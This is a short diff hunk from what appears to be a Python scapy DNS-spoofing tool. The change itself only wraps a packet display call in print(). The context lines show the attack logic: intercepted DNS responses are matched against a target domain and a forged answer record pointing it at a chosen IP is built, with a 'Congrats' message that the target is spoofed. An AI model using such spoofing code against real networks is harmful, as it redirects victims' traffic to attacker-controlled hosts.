@@ -120,7 +120,7 @@ try:
         ippacket = sc.IP(packet.get_payload())
         if ippacket.haslayer(sc.DNSRR):
             reqname = ippacket[sc.DNSQR].qname
-            ippacket.show()
+            print(ippacket.show())
             if domain in str(reqname):
                 print("[Congrats] --> Target is spoofed and directed to "+ip+" ....")
                 anspof = sc.DNSRR(rrname=domain, rdata=ip)
